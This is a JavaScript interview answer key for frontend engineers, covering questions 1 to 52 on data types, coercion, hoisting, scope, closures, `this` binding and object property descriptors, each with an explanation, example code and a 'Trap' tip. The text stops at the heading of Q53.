# JavaScript Interview Questions – Phase-wise Master Answer Key (6 Years Frontend Engineer)

**Level:** Beginner to Advanced
**Format:** Question & Answer, condensed (Explanation + Code Example + Common Trap)
**Total Questions:** 240
**Alignment:** Question numbers and phases match `javascript_interview_questions_6yrs_phase_wise.md` exactly — use either file to look up the same question by number.

---

## Table of Contents

- [Phase 1 – JavaScript Fundamentals & Execution Basics](#phase-1)
- [Phase 2 – Functions, Scope, Closures & `this`](#phase-2)
- [Phase 3 – Objects, Prototypes & Object APIs](#phase-3)
- [Phase 4 – Arrays, Strings, Maps, Sets & Data Handling](#phase-4)
- [Phase 5 – Asynchronous JavaScript & Event Loop](#phase-5)
- [Phase 6 – Browser APIs, DOM, BOM & Storage](#phase-6)
- [Phase 7 – ES6+ and Modern JavaScript Features](#phase-7)
- [Phase 8 – Error Handling, Security & Web Performance](#phase-8)
- [Phase 9 – Advanced JavaScript Output-based Questions](#phase-9)
- [Phase 10 – Senior Frontend JavaScript System-level Questions](#phase-10)

---
<a id="phase-1"></a>

## Phase 1 – JavaScript Fundamentals & Execution Basics

**Goal:** Build strong clarity on JS basics, runtime behavior, and core syntax.

### Q1. What is JavaScript?

**A:** A high-level, interpreted (JIT-compiled), single-threaded, dynamically-typed programming language that runs in browsers and on servers (Node.js). Originally built for adding interactivity to web pages, it now powers full-stack apps, mobile apps (React Native), and more.

**Trap:** Calling it "just a scripting language" undersells it in interviews — mention it's now used for full application stacks, not just DOM manipulation.

### Q2. What are the data types supported by JavaScript?

**A:** 7 primitive types + 1 reference type:

```javascript
// Primitives (immutable, compared by value)
typeof "hello"; // "string"
typeof 42; // "number"
typeof 10n; // "bigint"
typeof true; // "boolean"
typeof undefined; // "undefined"
typeof Symbol(); // "symbol"
typeof null; // "object" (famous quirk - see Q210)

// Reference type
typeof {}; // "object" (covers objects, arrays, functions, dates, etc.)
typeof []; // "object"
typeof function () {}; // "function" (technically a callable object)
```

**Trap:** Forgetting `bigint` and `symbol` when listing primitives — both are ES2015+/ES2020 additions interviewers use to check if your knowledge is current.

### Q3. What is the difference between primitive and non-primitive data types?

**A:** Primitives are immutable and compared/copied **by value**; non-primitives (objects, arrays, functions) are mutable and compared/copied **by reference**.

```javascript
let a = 10;
let b = a;
b = 20;
console.log(a); // 10 - unaffected, primitives copy by value

let obj1 = { x: 10 };
let obj2 = obj1;
obj2.x = 20;
console.log(obj1.x); // 20 - both point to the SAME object

obj1 === obj2; // true (same reference)
({ x: 20 }) === { x: 20 }; // false (different objects, same shape - needs parens, see Q95's sibling gotcha)
```

**Trap:** Assuming `obj2 = obj1` creates a copy — it copies the *reference*, not the object. This is the root cause behind Q18, Q56, and most "why did my state mutate unexpectedly" bugs.

### Q4. What is the difference between `null` and `undefined`?

**A:** `undefined` means a variable has been declared but not assigned a value (JS sets this automatically). `null` is an intentional "no value," explicitly assigned by the developer.

```javascript
let a;
console.log(a); // undefined - JS default

let b = null;
console.log(b); // null - explicit "empty" value

typeof undefined; // "undefined"
typeof null; // "object" (long-standing JS bug, never fixed for compatibility)

null == undefined; // true (loose equality treats them as equal)
null === undefined; // false (different types)
```

**Trap:** Using `== null` as a shortcut to check for both `null` and `undefined` in one comparison is actually a common, accepted pattern — not a mistake, but be ready to explain *why* it works (loose equality's special-case rule for null/undefined).

### Q5. What is the difference between `==` and `===`?

**A:** `==` (loose equality) coerces operand types before comparing; `===` (strict equality) compares both value and type with no coercion.

```javascript
5 == "5"; // true - string coerced to number
5 === "5"; // false - different types
0 == false; // true
0 === false; // false
null == undefined; // true (special case)
NaN == NaN; // false (NaN is never equal to itself - see Q211)
```

**Trap:** Always default to `===` in real code; `==` coercion rules have enough edge cases (`[] == false` is `true`!) that relying on it is a maintenance risk, not just a style preference.

### Q6. What is type coercion in JavaScript? *(new)*

**A:** JS automatically converting a value from one type to another when an operation expects a different type — happens implicitly (via operators) or explicitly (via functions like `Number()`, `String()`).

```javascript
// Implicit coercion
"5" + 3; // "53" - number coerced to string (+ prefers string concat)
"5" - 3; // 2   - string coerced to number (- only makes sense numerically)
"5" * "2"; // 10 - both coerced to numbers
true + true; // 2  - booleans coerced to 1/0
[] + []; // ""  - arrays coerced to strings, then concatenated (see Q212)

// Explicit coercion (preferred in real code)
Number("5"); // 5
String(5); // "5"
Boolean(""); // false
```

**Trap:** `+` is the odd one out — if *either* operand is a string, it concatenates; every other arithmetic operator (`-`, `*`, `/`) always coerces to number first.

### Q7. What are truthy and falsy values? *(new)*

**A:** In a boolean context (`if`, `&&`, `||`, `!!`), every value is either "truthy" or "falsy." JS has exactly **8 falsy values** — everything else is truthy.

```javascript
// All falsy values - memorize this exact list:
Boolean(false); // false
Boolean(0); // false
Boolean(-0); // false
Boolean(0n); // false (BigInt zero)
Boolean(""); // false
Boolean(null); // false
Boolean(undefined); // false
Boolean(NaN); // false

// Everything else is truthy - including these common gotchas:
Boolean("0"); // true - non-empty string!
Boolean([]); // true - empty array is an object, objects are always truthy
Boolean({}); // true - same reason
```

**Trap:** `[]` and `{}` are truthy — a very common interview trick since intuitively an "empty" thing feels falsy.

### Q8. What is `NaN`, and how do you check for it?

**A:** `NaN` ("Not a Number") represents an invalid numeric result. It's the only value in JS not equal to itself, which breaks naive checks.

```javascript
NaN === NaN; // false!
typeof NaN; // "number" - yes, NaN's type IS "number" (see Q211)
Number.isNaN(NaN); // true - the reliable way to check (see Q9)
```

**Trap:** Confusing `NaN`'s type — `typeof NaN` is `"number"`, not `"NaN"` or `"undefined"`, which trips people up constantly.

### Q9. What is the difference between `isNaN()` and `Number.isNaN()`?

**A:** Global `isNaN()` coerces its argument to a number first, which produces false positives; `Number.isNaN()` (ES6) does not coerce, so it only returns `true` for the actual `NaN` value.

```javascript
isNaN("hello"); // true - "hello" coerces to NaN, misleading!
isNaN(NaN); // true
isNaN("123"); // false - "123" coerces to a valid number

Number.isNaN("hello"); // false - it's a string, not actually NaN
Number.isNaN(NaN); // true
```

**Trap:** Always lead with "global `isNaN` coerces, `Number.isNaN` doesn't" as the one-line distinction — it's the exact thing this question is testing.

### Q10. What is the difference between `var`, `let`, and `const`?

**A:**

```javascript
var x = 1; // function-scoped, hoisted + initialized as undefined, re-declarable
let y = 2; // block-scoped, hoisted but in TDZ until declared, re-assignable
const z = 3; // block-scoped, hoisted but in TDZ, cannot be re-assigned

if (true) {
  var x2 = "a";
  let y2 = "b";
}
console.log(x2); // "a" - leaks out of the block
console.log(typeof y2); // ReferenceError if accessed - y2 doesn't exist here

const arr = [1, 2];
arr.push(3); // fine - const prevents re-assignment, not mutation
// arr = [4, 5];      // TypeError - cannot re-assign
```

**Trap:** `const` doesn't mean immutable — it only locks the *binding*, not the contents of an object/array.

### Q11. What is hoisting in JavaScript?

**A:** JS moves declarations (not initializations) to the top of their scope during the compile phase, before code executes.

```javascript
console.log(fn1()); // "hoisted!" - function declarations are fully hoisted
function fn1() {
  return "hoisted!";
}

console.log(x); // undefined, not ReferenceError - var is hoisted & initialized
var x = 5;

console.log(y); // ReferenceError - let/const are hoisted but stay in the TDZ
let y = 5;
```

**Trap:** Function *expressions* (`const fn = function(){}`) are NOT hoisted the way function *declarations* are — only the `const fn` binding hoists (into TDZ), not the function body.

### Q12. Are `let` and `const` hoisted?

**A:** Yes — technically. They're hoisted to the top of their block scope, but remain uninitialized in the **Temporal Dead Zone (TDZ)** until their declaration line runs, so accessing them early throws instead of returning `undefined`.

```javascript
{
  console.log(a); // ReferenceError: Cannot access 'a' before initialization
  let a = 10;
}
```

**Trap:** Saying "`let`/`const` aren't hoisted" is a common half-truth — the accurate answer is "hoisted but not initialized," which is exactly what the TDZ is (see Q13).

### Q13. What is the Temporal Dead Zone?

**A:** The span between entering a scope and the line where a `let`/`const` variable is actually declared. Accessing the variable anywhere in that span throws a `ReferenceError`.

```javascript
function example() {
  console.log(typeof myVar); // "undefined" - var, no TDZ
  console.log(typeof myLet); // ReferenceError - inside TDZ
  var myVar = 1;
  let myLet = 2;
}
```

**Trap:** The TDZ isn't a JS engine bug — it's an intentional design choice to catch use-before-declare bugs early, unlike `var`'s silent `undefined`.

### Q14. What is strict mode in JavaScript? *(new)*

**A:** An opt-in mode (`"use strict"`) that makes JS throw errors for things it used to silently allow — catching bugs and disabling some unsafe features.

```javascript
"use strict";

x = 10; // ReferenceError - can't create implicit globals (silent in non-strict)

function sum(a, a) {
  // SyntaxError - duplicate parameter names not allowed (see Q206)
  return a + a;
}

this; // undefined in a plain function call (non-strict: the global object)
```

**Trap:** ES6 modules and class bodies are **automatically strict** — you never need to write `"use strict"` yourself in modern module-based or class-based code.

### Q15. What are undeclared and undefined variables? *(new)*

**A:** An **undefined** variable has been declared but not assigned a value. An **undeclared** variable was never declared at all — referencing it throws, but *assigning* to it in non-strict mode silently creates a global (a classic bug source).

```javascript
let a;
console.log(a); // undefined - declared, no value

console.log(b); // ReferenceError: b is not defined - never declared

function leak() {
  c = 10; // no let/const/var - creates an accidental global (non-strict mode only)
}
leak();
console.log(c); // 10 - leaked into global scope!
```

**Trap:** "Undefined" and "not defined" sound similar but describe two different bugs — mixing them up in an interview signals imprecise understanding.

### Q16. What is variable shadowing? *(new)*

**A:** Declaring a variable in an inner scope with the same name as one in an outer scope — the inner one "shadows" (hides) the outer one for the rest of that block.

```javascript
let x = "outer";

function shadow() {
  let x = "inner"; // shadows the outer x
  console.log(x); // "inner"
}
shadow();
console.log(x); // "outer" - unaffected

// Illegal shadowing: you can't shadow `let` with `var` in the same/nested scope in a way that breaks the TDZ
let y = 1;
{
  var y = 2; // SyntaxError: Identifier 'y' has already been declared
}
```

**Trap:** "Illegal shadowing" (mixing `var` and `let` for the same name) is the specific follow-up interviewers ask after this question.

### Q17. What is the difference between global scope, function scope, and block scope?

**A:**

```javascript
var globalVar = "I'm global"; // accessible everywhere

function myFunction() {
  var functionScoped = "only inside this function";
  if (true) {
    let blockScoped = "only inside this block";
    var stillFunctionScoped = "var ignores the block!";
  }
  console.log(stillFunctionScoped); // works - var isn't block-scoped
  // console.log(blockScoped);         // ReferenceError
}
```

**Trap:** `var` ignores block boundaries entirely (`if`, `for`, `{}`) — it's only contained by function boundaries, which is exactly why `let`/`const` were introduced.

### Q18. What is the difference between pass by value and pass by reference? *(new)*

**A:** JS always passes arguments **by value** — but for objects, the "value" being copied is a reference (pointer) to the object, so mutations through that reference are visible outside the function, while reassignment is not.

```javascript
function changeValue(num) {
  num = 100; // reassigning a local copy
}
let x = 10;
changeValue(x);
console.log(x); // 10 - unaffected, primitive copied by value

function mutateObj(obj) {
  obj.name = "changed"; // mutates the object the reference points to
}
function reassignObj(obj) {
  obj = { name: "new object" }; // reassigns the LOCAL reference only
}
let person = { name: "original" };
mutateObj(person);
console.log(person.name); // "changed" - mutation is visible outside

reassignObj(person);
console.log(person.name); // still "changed" - reassignment inside doesn't escape
```

**Trap:** JS is technically **never** "pass by reference" in the C++ sense — it's "pass by value, where the value can be a reference." Mixing this up is one of the most common wrong answers in interviews.

### Q19. Why is JavaScript called a dynamically typed language? *(new)*

**A:** Variable types are determined and can change **at runtime**, not declared upfront — the same variable can hold a number, then a string, with no type annotation or compiler check.

```javascript
let x = 5; // number
x = "hello"; // now a string - completely legal
x = true; // now a boolean
x = { a: 1 }; // now an object
```

**Trap:** "Dynamically typed" ≠ "weakly typed" — they're related but distinct concepts; JS is both, and being able to explain the difference (dynamic = type checked at runtime, weak = allows implicit coercion between types) shows deeper understanding.

### Q20. What is the difference between mutable and immutable values?

**A:** Immutable values (primitives) cannot be changed after creation — any "modification" actually creates a new value. Mutable values (objects/arrays) can be changed in place, and `Object.freeze()` is the built-in way to lock that down.

```javascript
let str = "hello";
str[0] = "H"; // silently fails - strings are immutable
console.log(str); // "hello" unchanged
str = str.toUpperCase(); // creates a NEW string, doesn't mutate the old one

const obj = Object.freeze({ name: "John" });
obj.name = "Jane"; // fails silently (throws in strict mode)
console.log(obj.name); // "John" - unchanged

// Without freeze, objects are mutable by default:
const arr = [1, 2, 3];
arr.push(4); // mutates in place
console.log(arr); // [1, 2, 3, 4]
```

**Trap:** All 7 primitive types are immutable by spec — even strings, which *look* like they support index mutation but silently no-op instead.

---

<a id="phase-2"></a>

## Phase 2 – Functions, Scope, Closures & `this`

**Goal:** Master function behavior, closures, execution context, and `this` binding.

### Q21. What is a function declaration? *(new)*

**A:** A named function defined with the `function` keyword as its own statement — fully hoisted, so it can be called before its definition appears in the code.

```javascript
sayHi(); // "Hi!" - works, function declarations hoist completely

function sayHi() {
  console.log("Hi!");
}
```

**Trap:** This is the ONLY function form that's fully hoisted (both name and body) — every other form (expression, arrow, class method) is not.

### Q22. What is a function expression? *(new)*

**A:** A function assigned to a variable — treated as a value, not hoisted the way declarations are (only the variable binding hoists, per `var`/`let`/`const` rules).

```javascript
sayHi(); // TypeError: sayHi is not a function (var hoists as undefined)

var sayHi = function () {
  console.log("Hi!");
};
```

**Trap:** With `var` you get a `TypeError` (calling `undefined`); with `let`/`const` you'd get a `ReferenceError` from the TDZ instead — know which error type applies to which declaration.

### Q23. What is an anonymous function? *(new)*

**A:** A function with no name — legal wherever a function is used as a value (callbacks, expressions) but illegal as a standalone declaration.

```javascript
setTimeout(function () {
  console.log("anonymous callback");
}, 1000);

const add = function (a, b) {
  return a + b;
}; // anonymous, but usable via the `add` binding

// function () {}   // SyntaxError if used as a statement - needs a name
```

**Trap:** Named function expressions (`const add = function addNamed(a,b){...}`) are often better for debugging — the name shows up in stack traces, unlike a true anonymous function.

### Q24. What is an arrow function?

**A:** A compact function syntax (`=>`) that doesn't bind its own `this`, `arguments`, or `super` — it inherits all of those lexically from the enclosing scope.

```javascript
const add = (a, b) => a + b; // implicit return, no braces needed
const square = (x) => x * x;
const greet = (name) => {
  const msg = `Hello, ${name}!`;
  return msg; // explicit return needed once you use braces
};
const getRandom = () => Math.random(); // no params
```

**Trap:** Arrow functions can't be used as constructors (`new (() => {})()` throws) and have no `prototype` property — both direct consequences of not having their own `this`.

### Q25. What are the differences between normal functions and arrow functions?

**A:**

```javascript
const obj = {
  name: "John",
  regular: function () {
    console.log(this.name); // "John" - `this` = the object that called it
  },
  arrow: () => {
    console.log(this.name); // undefined - `this` = enclosing (module/global) scope
  },
};
obj.regular(); // "John"
obj.arrow(); // undefined

function normalFn() {
  console.log(arguments.length); // works
}
const arrowFn = (...args) => {
  console.log(args.length); // must use rest params instead - see Q26/Q27
};
```

**Trap:** Arrow functions are a poor fit for object methods precisely because of this `this` behavior — use a regular function (or method shorthand) whenever `this` needs to refer to the object.

### Q26. What is the `arguments` object? *(new)*

**A:** An array-*like* object automatically available inside regular functions, holding all arguments passed to the call — not a real array, so array methods like `.map()` don't work on it directly.

```javascript
function sum() {
  console.log(arguments); // [Arguments] { '0': 1, '1': 2, '2': 3 }
  console.log(arguments.length); // 3
  // arguments.map(x => x * 2);   // TypeError - not a real array

  const argsArray = Array.from(arguments); // convert first
  return argsArray.reduce((total, n) => total + n, 0);
}
sum(1, 2, 3); // 6
```

**Trap:** Modern code should prefer rest parameters (`function sum(...nums)`) over `arguments` — rest params give you a real array and work in arrow functions too.

### Q27. Why do arrow functions not have their own `arguments` object? *(new)*

**A:** By design — arrow functions inherit `arguments` lexically from their enclosing (non-arrow) scope, consistent with how they treat `this`. This is what makes rest parameters the necessary replacement inside arrows.

```javascript
function outer() {
  const inner = () => {
    console.log(arguments); // refers to OUTER's arguments, not inner's
  };
  inner(99); // calling inner with 99 changes nothing about `arguments` here
}
outer(1, 2, 3); // logs [Arguments] { '0': 1, '1': 2, '2': 3 } - outer's args

const standalone = (...args) => {
  console.log(args); // must use rest params - no enclosing function to inherit from
};
```

**Trap:** At the top level (no enclosing function), an arrow function trying to use `arguments` throws a `ReferenceError` — there's nothing to inherit.

### Q28. What is a callback function?

**A:** A function passed as an argument to another function, to be invoked later (synchronously or asynchronously).

```javascript
function greet(name, callback) {
  console.log("Hi " + name);
  callback();
}
greet("Alice", () => console.log("Callback executed"));

// Async example - the callback runs after the delay, not immediately
setTimeout(() => console.log("Runs after 1s"), 1000);
```

**Trap:** Callbacks aren't inherently async — `Array.prototype.map`'s callback runs synchronously; only APIs like `setTimeout` or `fetch` make the callback pattern asynchronous.

### Q29. What is a higher-order function?

**A:** A function that either takes another function as an argument, returns a function, or both. `map`, `filter`, `reduce`, and function factories are the classic examples.

```javascript
// Takes a function as an argument
[1, 2, 3].map((x) => x * 2); // [2, 4, 6]

// Returns a function
function multiplyBy(factor) {
  return function (num) {
    return num * factor;
  };
}
const double = multiplyBy(2);
double(5); // 10
```

**Trap:** "Higher-order" describes the function's *relationship to other functions*, not anything about complexity — a one-liner like `arr.map(fn)`'s caller counts.

### Q30. What is a first-class function? *(new)*

**A:** A language property (not a function type) meaning functions are treated as regular values — they can be assigned to variables, passed as arguments, returned from other functions, and stored in data structures. This is *what makes* higher-order functions (Q29) possible.

```javascript
const fn = function () {}; // assigned to a variable
const arr = [() => 1, () => 2]; // stored in an array
const obj = { greet: () => "hi" }; // stored as an object property

function makeAdder(x) {
  return (y) => x + y; // returned from a function
}
```

**Trap:** "First-class function" and "higher-order function" get used interchangeably by mistake — first-class is the *language capability*, higher-order is a *function that uses* that capability.

### Q31. What is a closure?

**A:** A function that retains access to variables from its enclosing (lexical) scope, even after that outer scope has finished executing.

```javascript
function outer() {
  let count = 0;
  return function inner() {
    count++;
    return count;
  };
}
const counter = outer();
counter(); // 1
counter(); // 2 - `count` persisted between calls, private to this closure
```

**Trap:** Every function in JS is technically a closure over its defining scope — the term is usually reserved in conversation for cases where that captured state is actually used meaningfully (like the counter above).

### Q32. What are practical use cases of closures?

**A:** Data privacy/encapsulation, function factories, and memoization/caching are the three most commonly cited.

```javascript
// 1. Private state (module pattern)
function createBankAccount(balance) {
  return {
    deposit: (amt) => (balance += amt),
    getBalance: () => balance, // balance is inaccessible from outside directly
  };
}

// 2. Function factories
const multiplyBy = (factor) => (num) => num * factor;
const triple = multiplyBy(3);

// 3. Memoization (see Q230) relies on a closure over the cache object
```

**Trap:** Closures are also the classic cause of accidental memory leaks (see Q185/186) — a closure holding a reference to a large object keeps it alive as long as the closure itself is reachable.

### Q33. What is lexical scope?

**A:** Scope determined by where variables and functions are *written* in the source code, not by where/how they're called. Nested functions can access variables from their outer (enclosing) functions.

```javascript
function outer() {
  const outerVar = "outer";
  function inner() {
    console.log(outerVar); // accessible - lexically nested inside outer
  }
  inner();
}
outer(); // "outer"
```

**Trap:** "Lexical" means "determined at write-time by nesting," which is why it's sometimes called "static scope" — contrast with Q35 (dynamic scope), which JS does NOT use.

### Q34. What is scope chaining?

**A:** When a variable isn't found in the current scope, JS looks outward through each enclosing scope in order until it finds it (or reaches global scope and throws).

```javascript
const global1 = "global";
function level1() {
  const l1 = "level1";
  function level2() {
    const l2 = "level2";
    function level3() {
      console.log(l2); // found in level2's scope
      console.log(l1); // found in level1's scope
      console.log(global1); // found in global scope
      // console.log(notDefined); // ReferenceError - not found anywhere in the chain
    }
    level3();
  }
  level2();
}
level1();
```

**Trap:** The chain only goes **outward**, never inward or sideways — a sibling function's variables are never visible, only ancestors'.

### Q35. What is the difference between lexical scope and dynamic scope? *(new)*

**A:** Lexical scope (what JS uses) is determined by where code is *written*; dynamic scope (which JS does NOT use) would be determined by where a function is *called from*. `this` is the one place JS-like dynamic behavior shows up, but it's still resolved by call-site rules, not true dynamic scoping of variables.

```javascript
let x = "global";

function printX() {
  console.log(x); // JS: always looks up the lexical (written) scope chain
}

function wrapper() {
  let x = "local to wrapper";
  printX(); // "global" - NOT "local to wrapper"
  // In a dynamically-scoped language, this would print "local to wrapper"
  // because dynamic scope resolves based on the CALL chain, not the write-time nesting
}
wrapper();
```

**Trap:** This question is testing whether you know JS made a deliberate choice — dynamic scope exists in other languages (like older Bash/Perl), and being able to contrast the two shows real language-design understanding, not just JS trivia.

### Q36. What is the `this` keyword in JavaScript?

**A:** `this` refers to the object currently executing the function — its value is determined by **how the function is called** (the "call site"), not where it's defined, except for arrow functions which never have their own `this`.

```javascript
const obj = {
  name: "John",
  show() {
    console.log(this.name); // "John" - `this` = the object before the dot
  },
};
obj.show();

function Person(name) {
  this.name = name; // `this` = the newly created object (constructor call)
}
```

**Trap:** There are 4 binding rules (default, implicit, explicit via call/apply/bind, `new`) plus the arrow-function exception — see Q37-39 for each in detail, and always mention the nested-function trap (shown there) since that's the specific gotcha interviewers dig for.

### Q37. How does `this` behave in global scope?

**A:** At the top level, `this` refers to the global object (`window` in browsers) in non-strict scripts — but in Node.js CommonJS modules it's an empty `module.exports` object, and in ES modules it's `undefined`.

```javascript
// Browser <script> tag, non-strict:
console.log(this); // Window {...}

// Node.js CommonJS module:
console.log(this); // {} (module.exports)

// ES module (type="module" or .mjs):
console.log(this); // undefined
```

**Trap:** "Global `this` is always `window`" is an outdated answer — Node and ES modules behave differently, and interviewers use this to check if your knowledge accounts for module systems.

### Q38. How does `this` behave inside normal (regular) functions?

**A:** Determined entirely by how the function is *called*: called standalone → `undefined`/global object; called as `obj.method()` → the object before the dot; called with `new` → the new instance.

```javascript
function show() {
  console.log(this);
}
show(); // undefined (strict mode) or global object (non-strict)

const obj = { show };
obj.show(); // logs `obj` - called as obj.show()

const detached = obj.show;
detached(); // undefined again! - lost the object context (a very common bug)
```

**Trap:** Assigning a method to a variable (`const fn = obj.method`) and calling it later **detaches** it from `obj` — `this` reverts to the default binding. This is exactly why React class components historically needed `.bind(this)` in constructors.

### Q39. How does `this` behave inside arrow functions?

**A:** Arrow functions have no `this` of their own — they capture `this` lexically from the enclosing scope at the time they're *defined*, and it never changes regardless of how the arrow function is later called.

```javascript
const obj = {
  name: "John",
  arrow: () => console.log(this.name), // `this` = enclosing (module) scope, NOT obj
};
obj.arrow(); // undefined

// The classic nested-function trap and its fix:
const obj2 = {
  name: "John",
  regularNested() {
    function inner() {
      console.log(this.name); // undefined - inner() loses `this` when called plainly
    }
    inner();

    const arrowInner = () => {
      console.log(this.name); // "John" - inherits `this` from regularNested
    };
    arrowInner();
  },
};
obj2.regularNested();
```

**Trap:** This nested-function trap is the single most commonly asked practical `this` question — always show both the broken version and the arrow-function fix.

### Q40. What is the difference between `call`, `apply`, and `bind`?

**A:** All three let you explicitly set `this`. `call` invokes immediately with arguments listed individually; `apply` invokes immediately with arguments as an array; `bind` returns a new function with `this` permanently set, without invoking it.

```javascript
const person = { name: "John" };
function greet(greeting, punctuation) {
  return `${greeting}, ${this.name}${punctuation}`;
}

greet.call(person, "Hi", "!"); // "Hi, John!" - args listed individually
greet.apply(person, ["Hi", "!"]); // "Hi, John!" - args as an array
const bound = greet.bind(person, "Hi"); // returns a NEW function, not yet called
bound("!"); // "Hi, John!" - can supply remaining args later
```

**Trap:** A handy mnemonic: **A**pply takes an **A**rray. `bind` is the one that doesn't invoke immediately — a common trip-up is expecting `bind()` to run the function right away.

### Q41. What is function currying?

**A:** Transforming a function that takes multiple arguments into a sequence of functions that each take one argument (or a subset), returning a new function until all arguments are supplied.

```javascript
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) return fn(...args);
    return (...next) => curried(...args, ...next);
  };
}

const sum3 = curry((a, b, c) => a + b + c);
sum3(1)(2)(3); // 6
sum3(1, 2)(3); // 6
```

**Trap:** Currying isn't just an academic exercise — it's the mechanism behind partial application (Q42) and libraries like Redux's `connect()`.

### Q42. What is partial application?

**A:** Fixing some arguments of a function upfront, producing a new function that takes the remaining arguments. Related to currying, but not identical — partial application doesn't require one-argument-at-a-time.

```javascript
function partial(fn, ...presetArgs) {
  return (...laterArgs) => fn(...presetArgs, ...laterArgs);
}

function request(method, url, body) {
  return `${method} ${url} - ${JSON.stringify(body)}`;
}

const post = partial(request, "POST"); // fix just the method
post("/api/users", { name: "Jane" }); // "POST /api/users - {"name":"Jane"}"
```

**Trap:** Currying always produces unary (one-arg) functions at each step; partial application can fix/supply any number of arguments at once — that's the precise technical distinction interviewers listen for.

### Q43. What is an Immediately Invoked Function Expression? *(new)*

**A:** A function defined and executed immediately, used to create an isolated scope — historically the main way to avoid polluting the global scope before `let`/`const`/modules existed.

```javascript
(function () {
  const privateVar = "hidden";
  console.log("IIFE ran immediately");
})();

// Arrow function IIFE
(() => {
  console.log("arrow IIFE");
})();

// Common historical use: avoid leaking variables into global scope
(function () {
  var counter = 0; // not accessible outside this IIFE
})();
```

**Trap:** IIFEs are largely legacy now that block-scoped `let`/`const` and ES modules (each module has its own scope) solve the same problem — but they still show up in the Module Pattern (see Q79) and in bundler output.

### Q44. What is recursion? *(new)*

**A:** A function that calls itself, breaking a problem into smaller sub-problems, with a base case that stops the recursion.

```javascript
function factorial(n) {
  if (n <= 1) return 1; // base case - stops the recursion
  return n * factorial(n - 1); // recursive case
}
factorial(5); // 120

function fibonacci(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
}
```

**Trap:** Forgetting the base case (or getting its condition wrong) causes infinite recursion and a `RangeError: Maximum call stack size exceeded` — always state the base case first when explaining recursion out loud.

### Q45. What is tail call optimization? *(new)*

**A:** An optimization where, if a function's very last action is calling another function (a "tail call"), the engine can reuse the current stack frame instead of adding a new one — preventing stack growth for deep recursion. Specified in ES6, but **not implemented in V8** (Chrome/Node's engine) — only Safari's JS engine supports it in practice.

```javascript
// Tail-call form (last action IS the recursive call)
function factorialTCO(n, acc = 1) {
  if (n <= 1) return acc;
  return factorialTCO(n - 1, n * acc); // tail position - nothing happens after this returns
}

// NOT tail-call form (multiplication happens AFTER the recursive call returns)
function factorialNormal(n) {
  if (n <= 1) return 1;
  return n * factorialNormal(n - 1); // work remains after the call returns
}
```

**Trap:** Don't claim "JS has tail call optimization" without the caveat — it's in the spec but V8 never shipped it, so writing tail-recursive code for performance won't actually help in Node or Chrome today.

---

<a id="phase-3"></a>

## Phase 3 – Objects, Prototypes & Object APIs

**Goal:** Understand object internals, prototypes, inheritance, and important object methods.

### Q46. What is an object in JavaScript?

**A:** A collection of key-value pairs (properties), where values can be any type — including other objects and functions. The foundation almost everything else in JS (arrays, functions, dates) is built on.

```javascript
const obj = {
  name: "John",
  age: 25,
  greet() {
    return `Hi, I'm ${this.name}`;
  },
};
```

**Trap:** Keys are always strings or Symbols internally — `{ 1: "a" }` looks like a numeric key but JS stores it as the string `"1"`.

### Q47. How do you create objects in JavaScript?

**A:** Four common ways, each suited to different situations:

```javascript
// 1. Object literal - most common for one-off objects
const obj1 = { name: "John" };

// 2. Constructor function - reusable "template" pre-ES6
function Person(name) {
  this.name = name;
}
const obj2 = new Person("Jane");

// 3. Object.create() - explicit prototype control (see Q60)
const proto = { greet() { return "hi"; } };
const obj3 = Object.create(proto);

// 4. Class syntax - modern, sugar over constructor functions (see Q153)
class Animal {
  constructor(name) { this.name = name; }
}
const obj4 = new Animal("Rex");
```

**Trap:** `Object.create(null)` produces an object with **no prototype at all** — no `.toString()`, no `.hasOwnProperty()` — a useful trick for a truly "bare" dictionary, but easy to forget exists.

### Q48. What is the difference between dot notation and bracket notation?

**A:** Dot notation requires a valid, static identifier name; bracket notation accepts any string expression, including dynamic/variable keys.

```javascript
const obj = { name: "John", "full-name": "John Doe" };

obj.name; // "John" - dot notation
obj["name"]; // "John" - bracket notation, same result
obj["full-name"]; // "John Doe" - dot notation CAN'T do this (invalid identifier)

const key = "name";
obj[key]; // "John" - bracket notation allows dynamic keys, dot notation can't
```

**Trap:** Dynamic property access (`obj[variable]`) is the main reason to reach for bracket notation — a very common real-world pattern (e.g. building objects from API response keys).

### Q49. What are object property descriptors? *(new)*

**A:** Metadata JS stores for every property beyond just its value — controlling whether it can be changed, deleted, or shown in loops. Retrieved via `Object.getOwnPropertyDescriptor()`.

```javascript
const obj = { name: "John" };
console.log(Object.getOwnPropertyDescriptor(obj, "name"));
// { value: 'John', writable: true, enumerable: true, configurable: true }

Object.defineProperty(obj, "id", {
  value: 123,
  writable: false, // can't be reassigned
  enumerable: false, // won't show in Object.keys() / for...in
  configurable: false, // can't be deleted or redefined
});
```

**Trap:** Properties created via plain object literals default to `writable`, `enumerable`, and `configurable` all `true` — descriptors only become restrictive when you use `Object.defineProperty()` explicitly.

### Q50. What is the difference between writable, enumerable, and configurable properties? *(new)*

**A:**

```javascript
const obj = {};
Object.defineProperty(obj, "prop", {
  value: 1,
  writable: false, // false = obj.prop = 2 fails silently (throws in strict mode)
  enumerable: false, // false = hidden from Object.keys(), for...in, JSON.stringify()
  configurable: false, // false = can't delete it, can't change these flags again
});

obj.prop = 2; // silently fails - not writable
console.log(Object.keys(obj)); // [] - not enumerable, invisible to Object.keys
delete obj.prop; // fails - not configurable
```

**Trap:** `configurable: false` is one-way — once set, you can never change that property's descriptor again (except toggling `writable` from `true` to `false`), not even to loosen it later.

### Q51. What is `Object.defineProperty()`? *(new)*

**A:** The method used to add a new property (or redefine an existing one) with precise control over its descriptor flags — commonly used to create computed getter/setter properties.

```javascript
const person = { firstName: "John", lastName: "Doe" };

Object.defineProperty(person, "fullName", {
  get() {
    return `${this.firstName} ${this.lastName}`;
  },
  set(value) {
    [this.firstName, this.lastName] = value.split(" ");
  },
  enumerable: true,
});

console.log(person.fullName); // "John Doe" - computed on access
person.fullName = "Jane Smith";
console.log(person.firstName); // "Jane"
```

**Trap:** A property defined with `get`/`set` can't also have a `value` — they're mutually exclusive descriptor forms (accessor vs. data descriptor).

### Q52. What is `Object.keys()`?

**A:** Returns an array of an object's own **enumerable** string-keyed property names (not inherited ones, not Symbols).

```javascript
const obj = { a: 1, b: 2, c: 3 };
Object.keys(obj); // ['a', 'b', 'c']
Object.keys([10, 20, 30]); // ['0', '1', '2'] - works on arrays too, as strings
```

**Trap:** Only own properties — anything inherited via the prototype chain is excluded, even if enumerable.

### Q53. What is `Object.values()`?

